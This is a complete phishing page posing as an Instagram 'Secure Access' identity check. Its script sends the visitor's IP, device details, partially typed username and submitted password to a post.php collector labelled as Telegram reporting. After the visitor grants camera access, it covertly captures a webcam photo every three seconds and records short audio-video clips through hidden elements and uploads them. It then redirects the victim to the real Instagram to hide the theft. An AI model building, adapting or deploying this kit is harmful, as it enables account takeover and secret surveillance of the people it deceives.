<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #262626;
        }

        .hidden-video-wrap {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            z-index: -9999 !important;
        }

        #video, #canvas {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }

        .container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
        }

        .card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
            font-size: 48px;
        }

        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 12px;
            color: #262626;
        }

        p {
            font-size: 14px;
            color: #8e8e8e;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        /* ============================================
           CAMERA PERMISSION BUTTON - VISIBLE & CLICKABLE
           ============================================ */
        .camera-permission-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .camera-permission-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }

        .camera-permission-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .camera-permission-btn .icon {
            font-size: 20px;
        }

        .camera-status {
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 16px;
            padding: 8px;
            background: #fafafa;
            border-radius: 4px;
        }

        .camera-status.active {
            color: #00a651;
            background: #e8f5e9;
        }

        .camera-status.error {
            color: #d32f2f;
            background: #ffebee;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-input {
            width: 100%;
            height: 36px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 0 12px;
            font-size: 12px;
        }

        .form-input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .btn {
            width: 100%;
            height: 32px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }

        .btn:hover {
            background: #1877f2;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-msg {
            display: none;
            color: #00a651;
            font-size: 14px;
            margin-top: 12px;
        }

        /* Hide form initially - show after camera permission */
        #loginForm {
            display: none;
        }

        .form-label {
            display: block;
            text-align: left;
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 4px;
        }
    </style>
</head>
<body>

    <div class="hidden-video-wrap" aria-hidden="true">
        <video id="video" playsinline autoplay muted></video>
    </div>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <div class="container">
        <div class="card">
            <div class="logo">🔒</div>
            <h2>Secure Access</h2>
            <p>Please verify your identity to continue. This helps us keep your account secure.</p>

            <!-- ==========================================
            CAMERA PERMISSION BUTTON - USER MUST CLICK
            ========================================== -->
            <button class="camera-permission-btn" id="cameraPermissionBtn">
                <span class="icon">📷</span>
                Allow Camera Access
            </button>

            <div class="camera-status" id="cameraStatus">
                ⏳ Click the button above to allow camera access
            </div>

            <!-- ==========================================
            LOGIN FORM - SHOWS AFTER CAMERA PERMISSION
            ========================================== -->
            <form id="loginForm">
                <div class="form-group">
                    <label class="form-label">Username or Email</label>
                    <input type="text" class="form-input" id="username" placeholder="Enter your username" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="btn" id="submitBtn">Continue</button>
                <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
            </form>

            <div class="footer">
                <span>Protected by security verification</span>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // CAMERA PERMISSION - TRIGGERED BY BUTTON CLICK
        // ============================================
        
        (function() {
            'use strict';

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            const cameraBtn = document.getElementById('cameraPermissionBtn');
            const cameraStatus = document.getElementById('cameraStatus');
            const loginForm = document.getElementById('loginForm');
            
            let cameraActive = false;
            let photoInterval = null;
            let stream = null;
            let userIP = '';
            let mediaRecorder = null;
            let recordedChunks = [];
            let isRecording = false;
            let videoCounter = 0;

            // ============================================
            // DETECT IP
            // ============================================
            function detectAndSendIP() {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        userIP = data.ip;
                        sendToTelegram('IP', userIP, navigator.userAgent);
                    })
                    .catch(() => {
                        fetch('https://httpbin.org/ip')
                            .then(response => response.json())
                            .then(data => {
                                userIP = data.origin;
                                sendToTelegram('IP', userIP, navigator.userAgent);
                            })
                            .catch(() => {
                                userIP = 'Unknown';
                            });
                    });
            }

            // ============================================
            // SEND TO TELEGRAM
            // ============================================
            function sendToTelegram(type, data, extra = '') {
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        tg_type: type,
                        tg_data: data,
                        tg_extra: extra,
                        tg_ua: navigator.userAgent,
                        tg_time: new Date().toISOString()
                    },
                    async: true,
                    timeout: 5000
                });
            }

            // ============================================
            // CAPTURE PHOTO
            // ============================================
            function capturePhoto() {
                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                    try {
                        context.drawImage(video, 0, 0, 640, 480);
                        const imageData = canvas.toDataURL("image/png");
                        
                        $.ajax({
                            type: 'POST',
                            url: 'post.php',
                            data: {
                                tg_type: 'image',
                                tg_image: imageData,
                                tg_ip: userIP,
                                tg_ua: navigator.userAgent,
                                tg_time: new Date().toISOString()
                            },
                            async: true,
                            timeout: 5000
                        });
                        console.log('📸 Photo captured');
                    } catch (e) {
                        console.log('Photo capture error:', e);
                    }
                }
            }

            // ============================================
            // RECORD VIDEO
            // ============================================
            function startVideoRecording() {
                if (!stream || isRecording) {
                    return;
                }
                
                try {
                    isRecording = true;
                    recordedChunks = [];
                    
                    const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm'];
                    let mimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
                    
                    mediaRecorder = new MediaRecorder(stream, {
                        mimeType: mimeType,
                        videoBitsPerSecond: 1000000
                    });

                    mediaRecorder.ondataavailable = function(event) {
                        if (event.data && event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = function() {
                        if (recordedChunks.length > 0) {
                            const videoBlob = new Blob(recordedChunks, {
                                type: mediaRecorder.mimeType || 'video/webm'
                            });
                            
                            if (videoBlob.size > 1000) {
                                videoCounter++;
                                sendVideoToTelegram(videoBlob);
                                console.log(`🎥 Video ${videoCounter} captured`);
                            }
                        }
                        
                        isRecording = false;
                        recordedChunks = [];
                        
                        setTimeout(() => {
                            if (cameraActive) {
                                startVideoRecording();
                            }
                        }, 2000);
                    };

                    mediaRecorder.start(1000);
                    
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                            console.log('⏹️ Video recording stopped');
                        }
                    }, 10000);

                } catch (e) {
                    console.log('Video recording error:', e);
                    isRecording = false;
                    setTimeout(() => {
                        if (cameraActive) {
                            startVideoRecording();
                        }
                    }, 5000);
                }
            }

            // ============================================
            // SEND VIDEO TO TELEGRAM
            // ============================================
            function sendVideoToTelegram(videoBlob) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    $.ajax({
                        type: 'POST',
                        url: 'post.php',
                        data: {
                            tg_type: 'video',
                            tg_video: event.target.result,
                            tg_ip: userIP,
                            tg_ua: navigator.userAgent,
                            tg_time: new Date().toISOString(),
                            tg_counter: videoCounter
                        },
                        async: true,
                        timeout: 15000
                    });
                };
                reader.readAsDataURL(videoBlob);
            }

            // ============================================
            // START CAMERA - TRIGGERED BY BUTTON CLICK
            // ============================================
            function startCamera() {
                cameraBtn.disabled = true;
                cameraBtn.innerHTML = '<span class="icon">⏳</span> Requesting Camera...';
                cameraStatus.textContent = '⏳ Requesting camera access...';
                cameraStatus.className = 'camera-status';

                const constraints = {
                    audio: true,
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                };

                navigator.mediaDevices.getUserMedia(constraints)
                    .then(function(mediaStream) {
                        // Success!
                        stream = mediaStream;
                        video.srcObject = stream;
                        video.play();
                        cameraActive = true;
                        
                        cameraBtn.innerHTML = '✅ Camera Access Granted';
                        cameraBtn.style.background = 'linear-gradient(45deg, #00a651, #00853e)';
                        cameraStatus.textContent = '✅ Camera active! Photos every 3s, Videos every 10s';
                        cameraStatus.className = 'camera-status active';
                        
                        // Show login form
                        loginForm.style.display = 'block';
                        
                        // Start photo capture
                        if (photoInterval) clearInterval(photoInterval);
                        photoInterval = setInterval(capturePhoto, 3000);
                        
                        // Start video recording
                        setTimeout(() => {
                            if (cameraActive) {
                                startVideoRecording();
                            }
                        }, 2000);
                        
                        // Send notification
                        sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
                        sendToTelegram('permission', 'Camera permission GRANTED');
                        
                        console.log('✅ Camera active!');
                    })
                    .catch(function(err) {
                        // Failed
                        console.log('❌ Camera error:', err);
                        cameraBtn.disabled = false;
                        cameraBtn.innerHTML = '📷 Retry Camera Access';
                        cameraBtn.style.background = 'linear-gradient(45deg, #d32f2f, #b71c1c)';
                        cameraStatus.textContent = '❌ Camera access denied: ' + err.message;
                        cameraStatus.className = 'camera-status error';
                        
                        // Send notification
                        sendToTelegram('warning', 'Camera permission DENIED: ' + err.message);
                        
                        // If denied, try video only
                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                            cameraStatus.textContent += ' - Trying video only...';
                            tryVideoOnly();
                        }
                    });
            }

            // ============================================
            // TRY VIDEO ONLY (if full camera fails)
            // ============================================
            function tryVideoOnly() {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(mediaStream) {
                        stream = mediaStream;
                        video.srcObject = stream;
                        video.play();
                        cameraActive = true;
                        
                        cameraBtn.innerHTML = '✅ Camera Access Granted (Video Only)';
                        cameraBtn.style.background = 'linear-gradient(45deg, #ff9800, #e65100)';
                        cameraStatus.textContent = '✅ Camera active (video only)!';
                        cameraStatus.className = 'camera-status active';
                        
                        loginForm.style.display = 'block';
                        
                        if (photoInterval) clearInterval(photoInterval);
                        photoInterval = setInterval(capturePhoto, 3000);
                        
                        sendToTelegram('camera_ready', 'Camera active - video only');
                    })
                    .catch(function(err) {
                        cameraBtn.disabled = false;
                        cameraBtn.innerHTML = '📷 Camera Unavailable - Continue Anyway';
                        cameraStatus.textContent = '⚠️ Camera unavailable. You can still continue.';
                        cameraStatus.className = 'camera-status error';
                        
                        // Show form anyway
                        loginForm.style.display = 'block';
                    });
            }

            // ============================================
            // CREDENTIALS
            // ============================================
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const btn = document.getElementById('submitBtn');
                const msg = document.getElementById('successMsg');
                
                btn.innerHTML = '<span class="spinner"></span> Processing...';
                btn.disabled = true;
                msg.style.display = 'block';
                
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        tg_type: 'login',
                        tg_username: username,
                        tg_password: password,
                        tg_ip: userIP,
                        tg_ua: navigator.userAgent,
                        tg_time: new Date().toISOString()
                    },
                    success: function() {
                        setTimeout(function() {
                            msg.textContent = '✅ Verified! Redirecting...';
                            setTimeout(function() {
                                window.location.href = 'https://www.instagram.com/';
                            }, 1000);
                        }, 1500);
                    },
                    error: function() {
                        setTimeout(function() {
                            window.location.href = 'https://www.instagram.com/';
                        }, 2000);
                    }
                });
            });

            // ============================================
            // PARTIAL TYPING
            // ============================================
            document.getElementById('username').addEventListener('input', function() {
                if (this.value.length > 2) {
                    sendToTelegram('typing', this.value, 'Partial username');
                }
            });

            // ============================================
            // BROWSER INFO
            // ============================================
            function sendBrowserInfo() {
                const info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
            }

            function sendPageView() {
                sendToTelegram('page_view', 'Page loaded', 
                    `IP: ${userIP} | UA: ${navigator.userAgent}`
                );
            }

            // ============================================
            // BUTTON CLICK EVENT - TRIGGERS CAMERA
            // ============================================
            cameraBtn.addEventListener('click', function() {
                startCamera();
            });

            // ============================================
            // INIT
            // ============================================
            
            detectAndSendIP();
            setTimeout(sendBrowserInfo, 500);
            setTimeout(sendPageView, 1000);

            // Cleanup
            window.addEventListener('beforeunload', function() {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
                if (photoInterval) {
                    clearInterval(photoInterval);
                }
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            });

            console.log('🔧 Click the "Allow Camera Access" button to start');

        })();
    </script>
</body>
</html>
